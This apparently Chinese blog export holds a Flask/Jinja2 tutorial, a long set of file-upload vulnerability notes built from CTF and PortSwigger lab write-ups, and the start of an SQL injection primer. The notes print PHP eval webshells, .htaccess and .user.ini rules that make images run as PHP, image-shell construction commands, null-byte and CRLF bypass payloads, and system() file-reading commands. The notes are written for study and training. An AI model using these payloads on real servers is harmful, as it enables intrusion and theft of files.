from flask import Flask, render_templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    # 定义一个变量，在模板中使用    greeting = &#x27;Hello, World!&#x27;    # 渲染模板并传递参数    return render_template(&#x27;index.html&#x27;, greeting=greeting)if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)

，render_template 函数用于渲染名为 index.html 的模板，并且将 greeting 变量传递给模板，以便在模板中使用。
接下来，创建一个名为 index.html 的模板文件:
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Flask Jinja2 Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;&#123;&#123; greeting &#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;

使用了双花括号 &#123;&#123; &#125;&#125; 来包含需要在模板中渲染的变量或表达式。在这里，&#123;&#123; greeting &#125;&#125; 就是在 Flask 视图函数中传递的 greeting 变量的值。
运行这个 Flask 应用程序后，当您访问根路径 / 时，将会显示 ‘Hello, World!’ 字样
再来一个比较复杂的使用了 Jinja 2 模板引擎的语法的html代码：
&lt;html&gt;&lt;body&gt;  &#123;% if name %&#125;    &lt;h2&gt;Hello &#123;&#123; name &#125;&#125;.&lt;/h2&gt;  &#123;% else %&#125;    &lt;h2&gt;Hello.&lt;/h2&gt;  &#123;% endif %&#125; &lt;/body&gt;&lt;/html&gt;


&#123;% if name %&#125;`: 这是一个 Jinja 2 的模板标签，用于开始一个条件语句。它表示如果 `name` 变量存在且不为空，则执行下面的代码块
- `&#123;% else %&#125;`: 这是一个 Jinja 2 的模板标签，用于指定条件语句中的“否则”部分。如果条件不满足（即 `name` 不存在或为空），则执行下面的代码块
- `&#123;% endif %&#125;: 这是一个 Jinja 2 的模板标签，用于结束条件语句的部分

表单（实例）先来两个模板文件：收集用户资料和显示用户资料的
第一个为收集用户资料的：
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;Bio Data Form&lt;/h1&gt;    &lt;form action=&quot;showbio&quot;&gt;        &lt;label&gt;Username&lt;/label&gt;        &lt;input type=&quot;name&quot; name=&quot;username&quot;&gt;&lt;br&gt;        &lt;label&gt;Email&lt;/label&gt;        &lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;&lt;br&gt;        &lt;label&gt;Hobbies&lt;/label&gt;        &lt;input type=&quot;name&quot; name=&quot;hobbies&quot;&gt;&lt;br&gt;        &lt;input type=&quot;submit&quot; name=&quot;&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 

第二个为显示用户资料的：
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Bio-Data Details&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;Bio-Data Details&lt;/h1&gt;    &lt;hr&gt;    &lt;h1&gt;Username: &#123;&#123; username &#125;&#125;&lt;/h1&gt;    &lt;h1&gt;Email: &#123;&#123; email &#125;&#125;&lt;/h1&gt;    &lt;h1&gt;Hobbies: &#123;&#123; hobbies &#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;

接下来就是python文件，在之前的基础上继续增加的：
from flask import Flask, render_template, request, redirect, url_forapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    # 定义一个变量，在模板中使用    greeting = &#x27;Hello, World!&#x27;    # 渲染模板并传递参数    return render_template(&#x27;index.html&#x27;, greeting=greeting)@app.route(&#x27;/form&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def bio_data_form():    if request.method == &quot;POST&quot;:        username = request.form[&#x27;username&#x27;]        age = request.form[&#x27;age&#x27;]        email = request.form[&#x27;email&#x27;]        hobbies = request.form[&#x27;hobbies&#x27;]        return redirect(url_for(&#x27;showbio&#x27;,                                username=username,                                age=age,                                email=email,                                hobbies=hobbies))    return render_template(&quot;bio_form.html&quot;)@app.route(&#x27;/showbio&#x27;, methods=[&#x27;GET&#x27;])  #get方法访问该路由def showbio():    username = request.args.get(&#x27;username&#x27;)    age = request.args.get(&#x27;age&#x27;)    email = request.args.get(&#x27;email&#x27;)    hobbies = request.args.get(&#x27;hobbies&#x27;)    return render_template(&quot;show_bio.html&quot;,                           username=username,                           age=age,                           email=email,                           hobbies=hobbies)if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)


redirect: 这是 Flask 中的一个重定向函数，用于将用户重定向到指定的 URL 地址。

url_for(&#39;showbio&#39;, username=username, age=age, email=email, hobbies=hobbies): 这是 Flask 中的一个 URL 构建函数，用于构建指定视图函数的 URL 地址。其中，&#39;showbio&#39; 是要构建 URL 的视图函数的名称，结果会返回与名为 &#39;showbio&#39; 的视图函数关联的 URL 地址，并将后面的参数作为查询参数添加到该 URL 中

request.args.get() 方法来获取 URL 查询字符串中的参数值。
具体来说，request.args 是一个字典对象，包含了 URL 查询字符串中的所有参数。而 request.args.get() 方法则用于从这个字典中获取指定参数的值


]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传学习</title>
    <url>/2024/03/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0_max/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[前端检测主要是通过javascript代码进行检测，非常容易进行绕过。
原理Web应用系统虽然对用户上传的文件进行了校验，但是校验是通过前端javascript代码完成的。由于恶意用户可以对前端javascript进行修改或者是通过抓包软件篡改上传的文件，就会导致基于js的校验很容易被绕过。
如何判断当前页面使用前端is的验证方式
   前端验证通过以后，表单成功提交后会通过浏览器发出─条网络请求，但是如果前端验证不成功，则不会发出这项网络请求;可以在浏览器的网络元素中查看是否发出了网络请求。

绕过方法
删除或者禁用js:火狐浏览器--&gt;about:config--&gt;JavaScriptenable-false (ajax)
使用代理上传文件，Burp Suite;上传符合要求的文件类型，抓包修改文件类型。
直接删除代码中onsubmit事件中关于文件上传时验证上传文件的相关代码即可或者可以不加载所有js，还可以将html源码copy一份到本地，然后对相应代码进行修改，本地提交即可。

CTFHub-web-文件上传-前端验证首先查看源码发现发现只允许jpg等几种后缀名文件通过，所以先将所要上传的文件后缀名改为jpg形式进行上传，中途用bp抓包，如下：

将filename改为test.php，然后发送：

发现文件上传成功，然后打开蚁剑进行连接，获取到flag文件，打开即可看到flag
绕过Content-Disposition在常规 HTTP 响应中 Content-Disposition ，响应标头是一个标头，指示内容是应在浏览器中以内联方式显示，即作为网页或网页的一部分，还是作为附件在本地下载和保存（这操作当然是在文件成功上传后，但是你无法通过正常的途径去访问）
举个例子：Content-Disposition: attachment; filename=&quot;filename.jpg&quot;
上述响应Content-Disposition 的属性 attachment 表示告诉浏览器将内容作为附件下载。另外，filename=&quot;filename.jpg&quot; 指定了下载的文件名为 filename.jpg
为了让我们的文件可以传上去，而不是被下载下来，我们可以用CRLF漏洞来进行绕过，即在我们可控的响应头内输入 \r\n\r\n或者是将其编码后的 %0d%0a%0d%0a，举个例子，如果说报头中的Content-Type可控，那么我们在后面键入text/html\r\n\r\n，就可以实现绕过，这是由于注入的回车符和换行符导致浏览器将 content-disposition 标头解释为 HTTP 正文的一部分，因此被忽略为告诉浏览器下载的指令，当然，使用 %00也可以达到相同的效果，下面我们来自己测试一下：
&lt;?php//highlight_file(__FILE__)$filename = $_GET[&#x27;file&#x27;];$fileheader = $_GET[&#x27;header&#x27;];$filetype = $_GET[&#x27;type&#x27;];if(isset($filetype)&amp;isset($fileheader)&amp;isset($filename))&#123;    header(&#x27;Content-Type:&quot;&#x27;.$filetype.&#x27;&quot;&#x27;);    header(&#x27;Content-Disposition:attachment;filename=&quot;&#x27;.$fileheader.&#x27;&quot;&#x27;);    readfile($filename);&#125;

正常在url后面输入?file=show.txt&amp;header=show.txt&amp;type=text/plain去访问的话会直接将文件下载下来，在hackbar或者bp里面自己访问的话并不会，然后如果我们输入?file=show.txt&amp;header=show.txt%0d%0a%0d%0a&amp;type=text/plain的话页面回显如下：
第一行的警告其实涉及到了php底层的c源码，如下：


我们试图往header里插入\r或者\n，会直接抛出异常，这一句直接失效，这其实是CRLF的另一种绕过姿势
当我们输入?file=show.txt&amp;header=show.txt%00&amp;type=text/plain时，页面回显如下

这第一行的警告里面也涉及到了php的底层c源码，如果是%00的话会抛出异常，如下

但是我们输入 ?file=show.txt&amp;header=show.txt&amp;type=text/plain%00的话，页面回显如下

那么为什么我们在type处输入%00，明明只是影响到Content Type的值，却还是把Content disposition给干掉了呢？这是因为第二个异常，通过搜索得知抛出第二个异常是因为header在执行的时候有任何数据被带到浏览器，而在这一数据就是指第一个异常，所以第二个header并不会执行
后端检测MIME检测什么是MIME MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。
常见的MIME类型text/plain （纯文本） 
text/html （HTML文档）
text/javascript （js代码）
application/xhtml+xml （XHTML文档）
image/gif （GIF图像） 
image/jpeg （JPEG图像）  
image/png （PNG图像） 
video/mpeg （MPEG动画）  
application/octet-stream （二进制数据） 
application/pdf （PDF文档）
检测方式在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。

MIME绕过的原理部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。
CTFHub-web-文件上传-MIME检测首先上传php文件弹窗文件类型不正确，检查源码发现并没有相关js代码，所以应该是后端
文件上传途中进行抓包，将 content-type字段改为 image/gif，然后发送请求包，上传的文件名后缀不需要改变

文件上传成功，然后就可以启动蚁剑了，蚁剑的密码为$_POST里面的内容，上传的文件内容如下：
&lt;?phpeval($_POST[&quot;shell&quot;]);?&gt;

00截断原理虽然web应用做了校验，但是由于文件上传后的路径用户可以控制，攻击者可以利用手动添加字符串标识符0X00的方式来将后面的拼接的内容进行截断，导致后面的内容无效，而且后面的内容又可以帮助我们绕过黑白名单的检测。
条件
- php版本要小于5.3.4，5.3.4及以上已经修复该问题
- PHP的magic_quotes_gpc为OFF状态
- 用户可指定上传路径并且上传路径通过GET方式传参

绕过思路在C语言中，空字符有一个特殊含义，代表字符串的拼接结束。这里我们使用的是php语言，属于高级语言，底层靠C语言来实现的，也就是说空字符的字符串拼接结束功能在PHP中也能实现。但是我们在URL中不能直接使用空，这样会造成无法识别；我们通过查看ASCII对照表，发现ASCII对照表第一个就空字符，它对应的16进制是00，这里我们就可以用16进制的00来代替空字符，让它截断后面的内容。
使用burpsuite进行抓包，因为这里是通过URL进行传递的文件上传后存储路径，所以需要对16进制的00进行URL编码，编码的结果就是%00，通过这种方式，就可以%00截断后面的内容，让拼接的文件名不再进行生效
题目首先查看相关源码：
if (!empty($_POST[&#x27;submit&#x27;])) &#123;    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);    $info = pathinfo($name);    $ext = $info[&#x27;extension&#x27;];                //首先取到上传文件的扩展名$ext    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);   //将扩展名与白名单进行匹配，为jpg、png或gif才能通过第一次过滤    if (in_array($ext, $whitelist)) &#123;        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;   //扩展名匹配之后，为上传的文件构造了一个新的存储路径$des        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;        &#125;    &#125; else &#123;        echo &quot;文件类型不匹配&quot;;    &#125;&#125;

in_array($ext, $whitelist)：in_array($ext, $whitelist) 是 PHP 中用于检查一个值是否存在于数组中的函数。$ext 是要检查的值，$whitelist 是要检查的数组。如果 $ext 存在于 $whitelist 数组中，则该函数返回 true；否则返回 false
move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)：

move_uploaded_file(): 这是 PHP 中用于将上传的文件移动到新位置的函数。它接受两个参数：源文件路径和目标文件路径。
$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]: 这是上传文件在服务器上的临时存储路径。在 PHP 中，通过 $_FILES 超全局变量可以访问到上传的文件信息，其中 &#39;file&#39; 是表单中 &lt;input type=&quot;file&quot;&gt; 控件的 name 属性值，&#39;tmp_name&#39; 表示上传文件的临时存储路径。
$des: 这是目标文件的路径，是之前代码中生成的文件路径。它是目标位置，上传的文件将被移动到这个位置。

根据上面的代码思路，首先我们把文件后缀名改为jpg形式，然后用bp抓个包然后修改get传参中的road值，如下所示：

上传成功，使用蚁剑获取到flag
POST传参保存路径与GET传参类似的的是：后端对文件路径的处理类似为
PHP$des = $_POST[&#x27;road&#x27;] . &quot;/对文件名的处理操作......&quot; . $ext;

此时road为我们可控的参数，但与GET传参不同的是，http请求内包含文件时，POST参数不再被自动解码，所以POST传参需要使用BP使用查看16进制的请求详情，修改一个十六进制的为00

步骤一：修改路径添加文件名，写入需要执行的代码语句

步骤二：切换为十六进制模式，修改所需要替换为00的位置

由于使用00截断，所以最后文件保存在/var/www/html/upload,名为test.php,根据位置，访问/upload/test.php,即进入我们所在的页面，可以看到PHP的配置信息，00截断成功
文件头检测漏洞原理在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。我们可以通过16进制编辑器打开文件，添加服务器允许的文件头以绕过检测。
另一种方法就是用画图软件画一张简单的图，太复杂的话会报错，然后抓包在文件末尾添加php代码
常见的文件头注意：下面的文件头的格式是16进制的格式：
 GIF：47 49 46 38 39 61 png：89 50 4E 47 0D 0A 1A 0A JPG：FF D8 FF E0 00 10 4A 46 49 46
 在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的
CTFHub 文件上传 - 文件头检测最开始上传一个.php后缀的文件，提交，alert()弹出一个窗口，只允许jpg,png,gif后缀提交，然后burpsuite抓包，把Content-type改为image&#x2F;png，然后发现还是上传不上去，有弹窗，发现有文件头检测
首先用画图工具做出一个最简单的图，太复杂的话会报错，然后上传，中途抓包修改数据如下：
报头中的文件后缀名要改回 php，然后发送请求包，成功
之后利用蚁剑获取到flag
内容检测图片马绕过漏洞原理一般文件内容验证使用getimagesize函数检测,会判断文件是否是一个有效的文件图片,如果是,则允许上传,否则的话不允许上传。  本实验就是将一句话木马插入到一个[合法]的图片文件当中,然后用webshell管理工具（比如蚁剑）进行远程连接。
图片马制作准备一张图片，这里为a.png，和一个一句话木马，通过以下命令合成一个图片马3.jpg： a.php内容：
&lt;?php phpinfo(); ?&gt;

命令（用cmd，在文件所在的目录）：
copy a.png /b + a.php /a 3.jpg  /b:指定以二进制格式复制、合并文件，用于图像或者声音类文件/a:指定以ascii格式复制、合并文件用于txt等文本类文件

 注：这条命令的意思是：通过copy命令，把a.png图片文件，以二进制文件形式添加到a.php文件中，以ASCII文本文件形式输出为3.jpg文件。
解析图片马一般解析图片马需要结合解析漏洞或者文件包含才能解析图片马
常见漏洞.htaccess文件解析漏洞什么是.htaccess文件htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能
漏洞利用前提 web具体应用没有禁止.htaccess文件的上传，同时web服务器提供商允许用户上传自定义的.htaccess文件。
原理 .htaccess文件(或者&quot;分布式配置文件&quot;) ,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
利用方式一般.htaccess可以用来留后门和针对黑名单绕过
 上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本木马的图片以脚本方式解析。
.htaccess文件内容.htaccess文件解析规则的增加，是可以按照组合的方式去做的，不过具体得自己多测试。
&lt;FilesMatch &quot;evil.gif&quot;&gt;SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行&lt;/FilesMatch&gt;

或者是以下内容
AddType application/x-httpd-php .txt


这段 Apache 配置语法用于将指定扩展名的文件类型设置为 PHP 文件类型。

AddType: 这是 Apache 配置指令，用于将文件扩展名关联到指定的 MIME 类型。
application/x-httpd-php: 这是 MIME 类型的标识符，表示 PHP 文件类型。
.txt: 这是要关联的文件扩展名，表示文本文件

CTFHub 文件上传 - htaccess配置文件 .htaccess文件文件名只能是这个，但是在windows系统中不能够直接这样命名，文件名不能为空，从网上发现可以通过另一种方法来修改：开启cmd，切换到文件所在的目录，然后通过rename直接修改：rename 1.htaccess .htaccess
.user.ini漏洞php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。 但是这种方式其实是有个前提的，因为.user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。
.user.ini文件内容：GIF89a       #文件欺骗头，让系统认为上传的是图片           auto_prepend_file=5.jpg

ctfshow-web153url上输入 &#x2F;upload，网页显示了nothing here表示可以用配置文件（因为upload目录下有php文件）
为了利用auto_append_file，我们首先上传.user.ini内容为 auto_append_file&#x3D;“xxx” xxx为我们上传的文件名，接着上传一个带木马的图片 因为upload有index.php，所以这个php就会添加一个include(“shell.png”)，就会包含到木马,这样就在每个php文件上包含了我们的木马文件
构造两个文件内容如下：
.user.ini.png内容：  auto_prepend_file=&quot;shell.png&quot;shell.png &lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;

开始做题：先上传.user.ini.png文件，并抓包，修改名称：.user.ini，然后放包


接着再上传图片马，最后就可以用蚁剑连接 /upload/，然后获取到flag
ctfshow-web154&amp;155首先按照上题步骤上传 .user.ini文件成功，然后上传图片马失败，根据题解说是过滤了php，于是可以试试短标签，如下：
可用使用&lt;?=(表达式)?&gt;进行绕过，&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt; 

于是图片内容变为：&lt;?=eval($_POST[shell]);?&gt;，上传成功，用蚁剑连接一下 /upload/，然后获取到flag
ctfshow-web156首先按照上题步骤上传 .user.ini文件成功，然后上传图片马失败，自己测试实在没有发现过滤了什么，看了提及人后才明白过滤掉了[]，在php中查看数组也可以用{}，所以只要把图片马内容中的[]全部改成{}，然后再上传就可以了
ctfshow-web157&amp;158[] &#123;&#125;, ; 都被过滤了，导致不能使用蚁剑来进行连接，所以我们直接远程代码执行
首先按照上面几题一样先上传 .user.ini文件，然后先上传图片马内容为：&lt;?=system(&#39;ls ../&#39;)?&gt;查看到flag的位置，因为php也被禁止掉了，所以我们可以使用通配符???或者*来代替php，内容为：&lt;?=system(&#39;cat ../flag.*|base64&#39;)?&gt;，再拿去base64解码后就可以得到flag了
Apache解析漏洞此漏洞实际为人为的错误配置导致的漏洞，与Apache本身无关
Apache对多后缀文件的识别概括来说为：

Apache允许文件有多个扩展名，并且会将所有后缀名进行识别，识别的顺序为：从右到左

如： .html.fr 映射到 Content-Type: text/html 和Content-Language: de。


Apache允许扩展名映射到元数据(包括：语言、内容类型、字符集或编码)、处理程序。

如 .html 映射到 Content-Type: text/html。


对于相同类型元数据，以从右到左第一个出现的为准，但对于语言和内容编码可累积的元数据，将会叠加
如：.gif.html根据此规则映射到 Content-Type: text/html。
 .html.en.de根据此规则映射到Content-Language: en, de 和 Content-Type: text/html

由于映射到处理程序和映射媒体类型，最后的返回结果不一致（一个为经过程序处理，一个为返回媒体文件）。当出现不同扩展名映射到处理程序和媒体类型时，映射到处理程序的优先等级高于映射到媒体类型
如：.imap.html扩展名.imap 映射到处理程序 imap-file， .html 映射到Content-Type: text/html ，根据上述原则，.imap.html文件会被imap-file程序处理


使用 Add* 指令，Apache处理一个文件时会应用上述规则
Add* 指令指的是如：AddType、AddDefaultCharset、AddEncoding、AddHandler、AddOutputFilter、AddLanguage、AddCharset等指令，其中AddHandler设置对应后缀名映射到处理程序，如：
AddHandler application/x-httpd-php .php

由此，当用户上传一个a.php.jpg文件时，Apace的配置文件中包含AddHandler处理PHP文件，且未对上传后的文件进行重命名，此时a.php.jpg被解析为一个PHP脚本，解析漏洞由此而来
解析配置漏洞条件
文件没有被重命名
Apache中配置中含有AddHandler的设置

解析配置漏洞解决办法
将上传的文件进行重命名
根据官方文档的说明，可以使用SetHandler指令来代替AddHandler，因为SetHandler仅根据最右端的后缀名来判断映射的处理程序

影响版本 apache 1.x  apache 2.2.x
IIS6.0解析漏洞IIS6.0解析漏洞分两种：  1、目录解析： 以xx.asp命名的文件夹里的文件都将会被当成ASP文件执行。  2、文件解析： xx.asp;.jpg 像这种畸形文件名在;后面的直接被忽略，也就是说当成xx.asp文件执行。
 IIS6.0 默认的可执行文件除了asp还包含这三种 .asa .cer .cdx。
IIS7.0 | IIS7.5 | Nginx的解析漏洞原理
 Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回Access denied。   这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行修理。 

举个例子，当php遇到文件路径&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php时，若&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php不存在，则会去掉最后的&#x2F;3.php，然后判断&#x2F;1.jpg&#x2F;2.txt是否存在，若存在，则把&#x2F;1.jpg&#x2F;2.txt当做文件&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php，若&#x2F;1.jpg&#x2F;2.txt仍不存在，则继续去掉&#x2F;2.txt，以此类推。
漏洞形式www.xxxxx.com/UploadFiles/image/1.jpg/1.php

另外两种解析漏洞www.xxxxx.com/UploadFiles/image/1.jpg%00.php` `www.xxxxx.com/UploadFiles/image/1.jpg/%20\0.php

条件竞争漏洞条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。
上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。 
由于服务器并发处理(同时)多个请求，假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a用户上传的文件，会有以下三种情况： 
1.访问时间点在上传成功之前，没有此文件。 
2.访问时间点在刚上传成功但还没有进行判断，该文件存在。 
3.访问时间点在判断之后，文件被删除，没有此文件。
二次渲染漏洞二次渲染原理 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。
绕过1、配合文件包含漏洞：  将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。  2、可以配合条件竞争：  这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传
如何判断图片是否进行了二次处理对比要上传图片与上传后的图片大小，使用16进制编辑器打开图片查看上传后保留了哪些数据，查看那些数据被改变。
利用文件上传实现日志包含从而连接蚁剑bp实战Lab：通过 Web Shell 上传远程执行代码题目要求：请上传一个基本的 PHP Web Shell 并使用它来泄露文件 /home/carlos/secret 的内容。使用实验室横幅中提供的按钮提交此机密
首先我们先登录账号，发现有个头像图片上传功能，开启proxy插件，先上传一个正常的图片，然后到代理模块中的http历史记录，选中/my-account/avatar条目发送到重放器中，然后更改过滤器配置如下：

应用发现多了一条目，是显示图片的，也发送到重放器中
第一个文件修改成如下内容：

然后第二个文件更改一下filename，再发送一遍，便得到了所需要的机密
Lab：通过绕过 Content-Type 限制上传 Web shell和上题不一样的地方就是多了对Conten-Type的检查，要求必须是图片类型的才可以
其余的操作步骤与上题一致，需要注意的是eval函数里面直接接语句的话要有双引号包括才可以
Lab：通过路径遍历进行Web shell上传要求：该实验室包含一个存在漏洞的图像上传功能。服务器被配置为阻止执行用户提供的文件，但可以通过利用第二个漏洞来绕过此限制。要完成该实验，请上传一个基本的 PHP Web shell 并使用它来窃取文件 /home/carlos/secret 的内容。使用实验室横幅中提供的按钮提交此机密
首先如果我们直接按照前两题的步骤来做该题的话，会发现页面会直接回显给我们输入的代码内容，并不会执行
发现上传图片的模块中的filename可以随意修改，所以我们尝试给该文件换个地方，如下：

发现我们输入的被直接处理掉了
再尝试一下进行url编码试试，如下：
成功上传该文件，于是我们去访问一下该文件，结果如下：
拿到机密，题目解决
Lab：通过扩展黑名单绕过上传Web shell正常上传一个文件后，我们将其改为php后缀的文件再次进行上传，发现页面会回显不允许php后缀的文件上传
于是尝试将后缀名改为.php4，成功上传，但发现页面会直接回显给我们输入的代码内容，并不会执行该代码
这时候我想到了可以通过上传.user.ini文件来进行绕过，于是进行尝试，但是发现页面还是直接回显输入的代码内容（不知道为什么行不通）。万幸我们还有另一种方法，可以通过上传.htaccess来绕过，该文件具体内容如下：
AddType application/x-httpd-php .txt

后缀为.txt的文件都会被当作php代码执行，于是我们上传

然后bp访问该url，得到机密，解决题目
Lab：通过混淆的文件扩展名上传 Web shell最开始是想着按照上题的思路先上传一个.htaccess文件，但是上传失败，页面回显只允许后缀名为png或者jpg的文件上传
但是这题的filename我们是可以改的，所以这题我们可以尝试使用00截断来绕过，如下：

然后直接访问shell.php，得到机密，题目解决
Lab：通过多语言 Web Shell 上传远程执行代码题目中提到：尽管它会检查文件的内容以验证它是否是真正的图像，但仍然可以上传和执行服务器端代码。
说明后端会检查图片的内容，但是我们可以尝试做一个图片马
首先上传一张正常的图片，然后到bp的代理模块中的HTTP历史记录里面将显示图片的条目发送到重放器里面
接着在本机上面将一张图片和一份php代码文件合成图片马，如下：
命令（用cmd，在文件所在的目录）：
copy a.png /b + a.php /a 3.php  /b:指定以二进制格式复制、合并文件，用于图像或者声音类文件/a:指定以ascii格式复制、合并文件用于txt等文本类文件

 注：这条命令的意思是：通过copy命令，把a.png图片文件，以二进制文件形式添加到a.php文件中，以ASCII文本文件形式输出为3.php文件。
接着将这份文件上传上去，并在bp中进行访问，得到我们所需要的机密，题目解决
借鉴超详细文件上传漏洞总结分析：https://cloud.tencent.com/developer/article/1938541
超详细文件上传漏洞总结分析
WELL’s blog
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2023/11/19/sql%E6%B3%A8%E5%85%A5%E5%BF%83%E5%BE%97_max/sql%E6%B3%A8%E5%85%A5%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[基础在学习SQL注入漏洞之前，先学习一个相关的知识点。在MySQL 5.0版本之后，MySQL默认在数据库中存放一个“information_schema”的数据库，在该库中，需要记住三个表名，分别是：schemata、tables、columns。
   1.schemata表存储该用户创建的所有数据库的库名。
   &gt;其中记录****数据库库名的字段名为*：*schemata_name****。
   2.tables表存储该用户创建的所有数据库的库名和表名。
   &gt;其中记录****数据库库名*和*表名的字段名分别是*：*table_schema*和*table_name****。
   3.columns表存储该用户创建的所有数据库的库名、表名和字段名。
   &gt;其中记录****数据库库名、表名和字段名的字段名分别是*：*tables_schema*、*table_name*和*column_name****。
   *information_schema.tables：数据库的表名*
   *information_schema.columns：数据库的列名*
注释符：
  在MySQL中，常见注释符的表达方式：
   # ......：#号后面的都会被注释
   -- ...... ：–号后面的都会被注释，不过在 – 的前后都需要加空格再加数据
   /\* ... \*/ ：内联注释，内联注释可以用于整个SQL语句中，用来执行SQL语句。
   例如：index?id&#x3D;-10 &#x2F;!union&#x2F; &#x2F;!select&#x2F; 1,2,3
注入中的常用函数以及命令1.union
用来合并两个或多个select语句查询的结果
语法：select column_name from table_name1 union select column_name from table_name2
注意：union内部的select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条select语句中的列的顺序必须是相同的
2.order by
默认升序，如果希望按照降序对记录进行排序，也可以使用desc关键字（order by被正则过滤掉的话，是可以用desc来进行判断字段）
例如：order by 1或者order by 2中其实1表示第一个栏位，2表示第二个栏位。如果当表中只有两个字段列时，order by 3就会报错，就是通过这种方式来判断字段数
3.concat
将多个字符串连接成一个字符串
语法：concat(str1,str2)
注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null
4.goup_concat()
该函数返回带有来自一个组的连接的非NULL值的字符串结果。
*功能：将group by产生的同一个分组中的值连接起来，返回一个字符串的结果。*
语法：group_concat( [distinct]要连接的字段[order by 排序字段 asc/desc] [separator‘分隔符’])
说明：distinct可以排除重复值，order by子句可以对结果中的值进行跑徐，separator是一个字符串值，缺省为一个逗号。
5.***substr()***：用来截取数据库中某个字段的一部分
语法：substr(string，start，length)
参数：string：必选，数据库中需要截取的字段
